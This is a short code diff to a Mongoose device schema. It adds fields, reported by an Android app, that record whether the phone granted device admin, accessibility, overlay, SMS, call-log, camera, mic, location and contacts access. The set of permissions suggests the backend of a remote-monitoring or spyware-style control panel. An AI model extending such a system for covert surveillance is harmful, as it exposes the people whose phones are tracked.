@@ -33,7 +33,7 @@ const deviceSchema = new mongoose.Schema({
         default: Date.now
     },
     
-    // ✅ NAYA — Battery + Charging
+    // Battery + Charging
     batteryLevel: {
         type: Number,
         default: null
@@ -41,6 +41,24 @@ const deviceSchema = new mongoose.Schema({
     isCharging: {
         type: Boolean,
         default: false
+    },
+    
+    // ✅ NAYA — Permissions & Services Status (Jo Android app bhej raha hai)
+    permissions: {
+        admin: { type: Boolean, default: false },
+        accessibility: { type: Boolean, default: false },
+        notification: { type: Boolean, default: false },
+        battery: { type: Boolean, default: false },
+        overlay: { type: Boolean, default: false },
+        usage: { type: Boolean, default: false },
+        camera: { type: Boolean, default: false },
+        mic: { type: Boolean, default: false },
+        location: { type: Boolean, default: false },
+        contacts: { type: Boolean, default: false },
+        sms: { type: Boolean, default: false },
+        call_log: { type: Boolean, default: false },
+        phone_state: { type: Boolean, default: false },
+        storage: { type: Boolean, default: false }
     },
     
     model: String,
